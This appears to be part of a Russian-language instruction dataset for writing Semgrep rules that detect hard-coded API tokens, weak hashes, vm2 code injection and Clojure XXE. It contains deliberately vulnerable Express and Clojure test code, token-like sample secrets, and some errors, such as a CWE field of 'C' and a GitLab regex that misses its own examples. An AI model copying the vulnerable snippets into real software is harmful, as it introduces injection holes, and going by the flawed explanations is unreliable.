    "instruction": "Разработай правило Semgrep для выявления: pulumi-api-token\nОписание уязвимости: A gitleaks pulumi-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: pulumi-api-token.go\n// ruleid: pulumi-api-token\npulumi-api-token_api_token = \"pul-1f26567544a1133ed9b4d70618e21ab7bf02d5d3\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: pulumi-api-token\npulumi-api-token_api_token = \"pul-1f26567544a1133ed9b4d70618e21ab7bf02d5d3\"\n• // ruleid: example-of-hardcoded-pulumi-api-token\nconst pulApiToken = 'pul-abc123def456ghijklmnopqrstuvwx';\n• // ruleid: another-hardcoded-pulumi-api-token\nvar pulApiKey = 'pul-0123456789abcdef0123456789abcdef01234567';\n\nБезопасные паттерны:  \n• // safe: no hardcoded pulomi api token\napiToken = os.Getenv(\"PULOMI_API_TOKEN\");\n• // safe: using environment variable for pulomi api token\npulApiToken := getSecureApiTokenFromVault();\n• // safe: pulomi api token read from config file\nconfig := loadConfigFile();\npulApiToken := config.ApiToken;\n\nЛегенда аннотаций:\n- // ruleid:pulumi-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pulumi-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pulumi-api-token\n  message: A gitleaks pulumi-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(pul-[a-f0-9]{40})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Pulumi API в исходном коде. Регулярное выражение ищет строку, начинающуюся с 'pul-', за которой следует ровно 40 шестнадцатеричных символов, и либо завершающуюся пробелом, новой строкой или специальным символом ('', \"\", ;, `), либо заканчивающуюся концом строки. Это соответствует формату токена Pulumi API, который обычно выглядит так: pul-<40hexchars>. Правило применяет нечувствительный к регистру поиск ('?i') для обеспечения соответствия независимо от регистра букв.\n\n# Ключевые элементы:\n- ID: pulumi-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "pulumi-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gitlab-pat\nОписание уязвимости: A gitleaks gitlab-pat was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: gitlab-pat.go\n// ruleid: gitlab-pat\ngitlab_api_token = \"glpat-62o83rs98y87jyfaq5zq\"\ngitlab_api_token = \"glptt-23d48505ab5b2a7ccc60f3d069f649040f673d44\"\ngitlab_api_token = \"GR1348941mkiqtyh4m59oy2d9ehxb\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: gitlab-pat.go\n// ruleid: gitlab-pat\ngitlab_api_token = \"glpat-62o83rs98y87jyfaq5zq\";\n• // File: example.go\n// ruleid: gitlab-pat\ngitlab_api_token := \"glptt-23d48505ab5b2a7ccc60f3d069f649040f673d44\";\n• // File: config.go\n// ruleid: gitlab-pat\nconst gitlabToken = \"GR1348941mkiqtyh4m59oy2d9ehxb\";\n\nБезопасные паттерны:  \n• // File: safe.go\nvar gitlabApiToken string = os.Getenv(\"GL_TOKEN\");\n• // File: secure.go\nfunc getGitLabToken() string { return vault.GetSecret(\"gitlab_token\") }\n• // File: env.go\nimport _ \"github.com/joho/godotenv\"; func init() { loadEnv() }; var gitlabApiToken string = os.Getenv(\"GL_API_KEY\")\n\nЛегенда аннотаций:\n- // ruleid:gitlab-pat: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gitlab-pat: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gitlab-pat\n  message: A gitleaks gitlab-pat was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: glpat-[0-9a-zA-Z\\-\\_]{20}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов GitLab Personal Access Token (gitlab-pat). Pattern-regex определяет шаблон 'glpat-' за которым следует последовательность из 20 символов, состоящих из цифр, букв и специальных символов (-,_). Это соответствует формату токена GitLab API, который начинается с префикса 'glpat-', после которого идет уникальный идентификатор пользователя.\n\n# Ключевые элементы:\n- ID: gitlab-pat\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "gitlab-pat",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения mailgun-private-api-token\nОписание уязвимости: A gitleaks mailgun-private-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: mailgun-private-api-token.go\n// ruleid: mailgun-private-api-token\nmailgun_api_token = \"key-d4242b89214d60c0b4f13dd068d8c3f4\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: mailgun-private-api-token\nmailgun_api_token = \"key-d4242b89214d60c0b4f13dd068d8c3f4\"\n• // ruleid: mailgun-private-api-token\nvar mailgunToken = 'key-abc123def456ghijklmnopqrstuvwx'\n• // ruleid: mailgun-private-api-token\nconst mailGunApiKey = \"key-0123456789abcdef0123456789abcdef\"\n\nБезопасные паттерны:  \n• // safe: no mailgun api token hardcoded\nmailgun_api_token = os.Getenv(\"MAILGUN_API_KEY\")\n• // safe: using environment variable for mailgun api key\nvar mailgunToken = getMailgunTokenFromVault()\n• // safe: mail gun api key retrieved from config file\nconst mailGunApiKey = config.MailGunAPIKey\n\nЛегенда аннотаций:\n- // ruleid:mailgun-private-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:mailgun-private-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: mailgun-private-api-token\n  message: A gitleaks mailgun-private-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:mailgun)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(key-[a-f0-9]{32})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена API Mailgun. Оно ищет строку, содержащую 'mailgun' вместе с токеном длиной 32 символа, представляющим собой UUID v4, который обычно используется в качестве секретного ключа API Mailgun. Правило применяет нечувствительность к регистру ('(?i)') и допускает различные разделители, такие как пробелы, знаки равенства и кавычки.\n\n# Ключевые элементы:\n- ID: mailgun-private-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "mailgun-private-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: twitter-bearer-token\nОписание уязвимости: A gitleaks twitter-bearer-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twitter-bearer-token.go\n// ruleid: twitter-bearer-token\ntwitter_api_token = \"AAAAAAAAAAAAAAAAAAAAAA7PZ6bMqiP2Qx%OMhXlEi2cDlSING48cho5myWTUeulC1NvDn0FiCkRBnQlvK7ELVVlpfCq6AqLEgsWbx\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: twitter-bearer-token\ntwitter_api_token = \"AAAAAAAAAAAAAAAAAAAAAA7PZ6bMqiP2Qx%OMhXlEi2cDlSING48cho5myWTUeulC1NvDn0FiCkRBnQlvK7ELVVlpfCq6AqLEgsWbx\"\n• // ruleid: twitter-bearer-token\nconst twitToken = \"B3F4H5J6K7L8M9N0PQRSUVWXYZabcdefg\";\n• // ruleid: twitter-bearer-token\nglobalTwitterToken = \"ABC1234567890ABCDEFGHIJKLMNOPQRSTUVWXZY\";\n\nБезопасные паттерны:  \n• import os\n\ntwitter_api_token = os.environ.get('TWITTER_API_TOKEN')\n• twitter_api_key = get_secret_from_secure_vault('twitter_api_key')\n• // allowid: safe-twitter-bearer-token\napi_token = \"valid_token\"\n\nЛегенда аннотаций:\n- // ruleid:twitter-bearer-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twitter-bearer-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twitter-bearer-token\n  message: A gitleaks twitter-bearer-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:twitter)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}(A{22}[a-zA-Z0-9%]{80,100})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена Twitter bearer в исходном коде. Регулярное выражение ищет строку, начинающуюся с 'twitter', за которой следует произвольная последовательность символов длиной от 0 до 20, затем символ '=' или один из нескольких специальных символов, после чего идет строка длиной от 80 до 100 символов, состоящая только из буквенно-цифровых символов и знака '%'. Это соответствует формату токенов Twitter bearer.\n\n# Ключевые элементы:\n- ID: twitter-bearer-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twitter-bearer-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: insecure-hashes\nОписание уязвимости: Detected cryptographically insecure hashing function\nCWE: C\nТип анализа: search\nЯзык: rust",
    "input": "Требования:\n- Язык: rust\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-hashes.rs\nuse md2::{Md2};\nuse md4::{Md4};\nuse md5::{Md5};\nuse sha1::{Sha1};\nuse sha2::{Sha256};\n\n// ruleid: insecure-hashes\nlet mut hasher = Md2::new();\n\n// ruleid: insecure-hashes\nlet mut hasher = Md4::new();\n\n// ruleid: insecure-hashes\nlet mut hasher = Md5::new();\n\n// ruleid: insecure-hashes\nlet mut hasher = Sha1::new();\n\n// ok: insecure-hashes\nlet mut hasher = Sha256::new();  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: insecure-hashes.rs\nlet mut hasher = Md2::new();\n• // File: insecure-hashes.rs\nlet mut hasher = Md4::new();\n• // File: insecure-hashes.rs\nlet mut hasher = Md5::new();\n\nБезопасные паттерны:  \n• // File: secure-hashes.rs\nlet mut hasher = Sha256::new();\n\nЛегенда аннотаций:\n- // ruleid:insecure-hashes: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-hashes: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: insecure-hashes\n    message: Detected cryptographically insecure hashing function\n    pattern-either:\n      - pattern: \"md2::Md2::new(...)\"\n      - pattern: \"md4::Md4::new(...)\"\n      - pattern: \"md5::Md5::new(...)\"\n      - pattern: \"sha1::Sha1::new(...)\"\n    metadata:\n      references:\n        - https://github.com/RustCrypto/hashes\n        - https://docs.rs/md2/latest/md2/\n        - https://docs.rs/md4/latest/md4/\n        - https://docs.rs/md5/latest/md5/\n        - https://docs.rs/sha-1/latest/sha1/\n      technology:\n        - rust\n      category: security\n      cwe: \"CWE-328: Use of Weak Hash\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: MEDIUM\n      subcategory: audit\n    languages: [rust]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования криптографически небезопасных хэш-функций в Rust-коде. Анализ выполняется методом поиска (search) путем сопоставления строковых шаблонов с вызовом конструктора функций хеширования, таких как md2::Md2::new(), md4::Md4::new() и др. Опасным считается использование устаревших или слабых алгоритмов хэширования, например MD2, MD4 и SHA-1, которые подвержены атакам и не обеспечивают достаточный уровень защиты. Правило использует оператор 'pattern-either' для объединения нескольких паттернов, каждый из которых соответствует определенной функции хэширования.\n\n# Ключевые элементы:\n- ID: insecure-hashes\n- Язык: rust \n- Тип: a\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-hashes",
      "language": "rust",
      "severity": "WARNING",
      "rule_type": "a",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: express-vm2-injection\nОписание уязвимости: Make sure that unverified user data can not reach `vm2`.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: express-vm2-injection.js\nconst fs = require('fs');\nconst {VM, NodeVM} = require('vm2');\nconst express = require('express')\nconst app = express()\nconst port = 3000\n\napp.get('/', (req, res) => res.send('Hello World!'))\n\napp.get('/test1', (req, res) => {\n  code = `\n    console.log(${req.query.input})\n  `;\n\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  // ruleid:express-vm2-injection\n  new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n\n  res.send('hello world');\n})\n\napp.get('/test2', function (req, res) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  // ruleid:express-vm2-injection\n  nodeVM.run('console.log(' + req.query.input + ')')\n\n  res.send('hello world');\n})\n\napp.get('/test3', function (req, res) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  // ruleid:express-vm2-injection\n  const script = new VMScript(`console.log(${req.query.input})`)\n  // ruleid:express-vm2-injection\n  nodeVM.run(script)\n\n  res.send('hello world')\n})\n\napp.get('/ok-test1', async function (req, res) {\n  code = `\n    console.log(\"Hello world\")\n  `;\n\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const vmResult = new VM({\n    timeout: 40 * 1000,\n    sandbox\n  }).run(code);\n\n  res.send('hello world');\n})\n\napp.get('/ok-test2', function (req, res) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  nodeVM.run('console.log(\"Hello world\")')\n\n  res.send('hello world');\n})\n\napp.get('/ok-test3', function (req, res) {\n  const sandbox = {\n    setTimeout,\n    fs: {\n      watch: fs.watch\n    }\n  };\n\n  const nodeVM = new NodeVM({timeout: 40 * 1000, sandbox});\n  const script = new VMScript('console.log(\"Hello world\")')\n  nodeVM.run(script)\n\n   # Ограничиваем длину\n\nОпасные паттерны:\n• code = `console.log(${req.query.input})`; new VM({...}).run(code);\n• nodeVM.run('console.log(' + req.query.input + ')');\n• script = new VMScript(`console.log(${req.query.input})`); nodeVM.run(script);\n\nБезопасные паттерны:  \n• code = `console.log(\"Hello world\")`; new VM({...}).run(code);\n• nodeVM.run('console.log(\"Hello world\")');\n• script = new VMScript('console.log(\"Hello world\")'); nodeVM.run(script);\n\nЛегенда аннотаций:\n- // ruleid:express-vm2-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-vm2-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: express-vm2-injection\n  message: >-\n    Make sure that unverified user data can not reach `vm2`.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-inside: |\n        require('vm2')\n        ...\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              $VM = new VM(...)\n              ...\n          - pattern-inside: |\n              $VM = new NodeVM(...)\n              ...\n        - pattern: |\n            $VM.run(...)\n      - pattern: |\n          new VM(...).run(...)\n      - pattern: |\n          new NodeVM(...).run(...)\n      - pattern: |\n          new VMScript(...)\n      - pattern: |\n          new VM(...)\n      - pattern: |-\n          new NodeVM(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования неподтвержденных пользовательских данных в конструкциях, связанных с выполнением кода через модули 'vm2' или 'NodeVM'. Анализ выполняется путем отслеживания источников (untrusted user inputs) и их передачи в вызовы методов run(), которые могут потенциально выполнить вредоносный код. Правило использует метапеременные для захвата различных частей запроса HTTP, таких как query, body, params, cookies и headers, а также шаблоны для идентификации вызовов функций, использующих эти данные.\n\n# Ключевые элементы:\n- ID: express-vm2-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "express-vm2-injection",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: documentbuilderfactory-xxe\nОписание уязвимости: DOCTYPE declarations are enabled for javax.xml.parsers.SAXParserFactory. Without prohibiting external entity declarations, this is vulnerable to XML external entity attacks. Disable this by setting the feature \"http://apache.org/xml/features/disallow-doctype-decl\" to true. Alternatively, allow DOCTYPE declarations and only prohibit external entities declarations. This can be done by setting the features \"http://xml.org/sax/features/external-general-entities\" and \"http://xml.org/sax/features/external-parameter-entities\" to false.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: search\nЯзык: clojure",
    "input": "Требования:\n- Язык: clojure\n- Тип анализа: search\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: documentbuilderfactory-xxe.clj\n(ns vulnerable-1\n  (:require [clojure.xml :as xml]))\n\n(defn vulnerable [x]\n  // ruleid: documentbuilderfactory-xxe\n  (clojure.xml/parse x))\n\n(defn startparse-sax-doctype [s ch]\n  (..\n    (doto (javax.xml.parsers.SAXParserFactory/newInstance)\n      // ruleid: documentbuilderfactory-xxe\n      (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" false)\n      (.setFeature \"http://xml.org/sax/features/external-general-entities\" true)\n      (.setFeature \"http://xml.org/sax/features/external-parameter-entities\" true))\n    (newSAXParser)\n    (parse s ch)))\n\n(def vulnerable [input]\n  (clojure.xml/parse input startparse-sax-doctype))\n\n(defn startparse-sax-no-doctype [s ch]\n  (..\n    (doto (javax.xml.parsers.SAXParserFactory/newInstance)\n      // ok: documentbuilderfactory-xxe\n      (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" true)\n      (.setFeature \"http://xml.org/sax/features/external-general-entities\" true)\n      (.setFeature \"http://xml.org/sax/features/external-parameter-entities\" true))\n    (newSAXParser)\n    (parse s ch)))\n\n(defn startparse-sax-doctype-no-entities [s ch]\n  (..\n    (doto (javax.xml.parsers.SAXParserFactory/newInstance)\n      // ok: documentbuilderfactory-xxe\n      (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" false)\n      (.setFeature \"http://xml.org/sax/features/external-general-entities\" false)\n      (.setFeature \"http://xml.org/sax/features/external-parameter-entities\" false))\n    (newSAXParser)\n    (parse s ch)))  # Ограничиваем длину\n\nОпасные паттерны:\n• (defn vulnerable [x] (clojure.xml/parse x))\n• (.. (doto (javax.xml.parsers.SAXParserFactory/newInstance) (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" false) ...) (newSAXParser) (parse s ch))\n\nБезопасные паттерны:  \n• (defn startparse-sax-no-doctype [s ch] (.. (doto (javax.xml.parsers.SAXParserFactory/newInstance) (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" true) ...) (newSAXParser) (parse s\n• (defn startparse-sax-doctype-no-entities [s ch] (.. (doto (javax.xml.parsers.SAXParserFactory/newInstance) (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" false) (.setFeature \"http\n\nЛегенда аннотаций:\n- // ruleid:documentbuilderfactory-xxe: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:documentbuilderfactory-xxe: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: documentbuilderfactory-xxe\n    languages:\n      - clojure\n    severity: ERROR\n    metadata:\n      cwe:\n      - 'CWE-611: Improper Restriction of XML External Entity Reference'\n      owasp:\n      - A04:2017 - XML External Entities (XXE)\n      - A05:2021 - Security Misconfiguration\n      asvs:\n        section: V5 Validation, Sanitization and Encoding\n        control_id: 5.5.2 Insecue XML Deserialization\n        control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v55-deserialization-prevention\n        version: '4'\n      references:\n      - https://semgrep.dev/blog/2022/xml-security-in-java\n      - https://semgrep.dev/docs/cheat-sheets/java-xxe/\n      - https://xerces.apache.org/xerces2-j/features.html\n      source-rule-url: https://github.com/clj-holmes/clj-holmes-rules/blob/main/security/xxe-clojure-xml/xxe-clojure-xml.yml\n      category: security\n      technology:\n      - clojure\n      - xml\n      cwe2022-top25: true\n      cwe2021-top25: true\n      subcategory:\n      - vuln\n      likelihood: LOW\n      impact: HIGH\n      confidence: HIGH\n    message: >-\n      DOCTYPE declarations are enabled for javax.xml.parsers.SAXParserFactory.\n      Without prohibiting external entity declarations, this is vulnerable to XML external entity attacks.\n      Disable this by setting the feature \"http://apache.org/xml/features/disallow-doctype-decl\" to true.\n      Alternatively, allow DOCTYPE declarations and only prohibit external entities declarations.\n      This can be done by setting the features \"http://xml.org/sax/features/external-general-entities\" and\n      \"http://xml.org/sax/features/external-parameter-entities\" to false.\n    patterns:\n      - pattern-inside: |\n          (ns ... (:require [clojure.xml :as ...]))\n          ...\n      - pattern-either:\n          - pattern-inside: |\n              (def ... ... ( ... ))\n          - pattern-inside: |\n              (defn ... ... ( ... ))\n      - pattern-either:\n        - pattern: (clojure.xml/parse $INPUT)\n        - patterns:\n          - pattern-inside: |\n              (doto (javax.xml.parsers.SAXParserFactory/newInstance) ...)\n          - pattern: (.setFeature \"http://apache.org/xml/features/disallow-doctype-decl\" false)\n          - pattern-not-inside: |\n              (doto (javax.xml.parsers.SAXParserFactory/newInstance)\n                ...\n                (.setFeature \"http://xml.org/sax/features/external-general-entities\" false)\n                ...\n                (.setFeature \"http://xml.org/sax/features/external-parameter-entities\" false)\n                ...)\n          - pattern-not-inside: |\n              (doto (javax.xml.parsers.SAXParserFactory/newInstance)\n                ...\n                (.setFeature \"http://xml.org/sax/features/external-parameter-entities\" false)\n                ...\n                (.setFeature \"http://xml.org/sax/features/external-general-entities\" false)\n                ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования класса SAXParserFactory из пакета javax.xml.parsers в языке Clojure. Оно проверяет наличие вызова метода setFeature с параметром \"http://apache.org/xml/features/disallow-doctype-decl\", значение которого установлено в false. Это указывает на то, что разрешены внешние сущности, что делает приложение уязвимым к атакам XXE (XML External Entity). Правило также учитывает случаи, когда внешние общие и параметрические сущности разрешены, но не запрещены объявления DOCTYPE.\n\n# Ключевые элементы:\n- ID: documentbuilderfactory-xxe\n- Язык: clojure \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "documentbuilderfactory-xxe",
      "language": "clojure",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
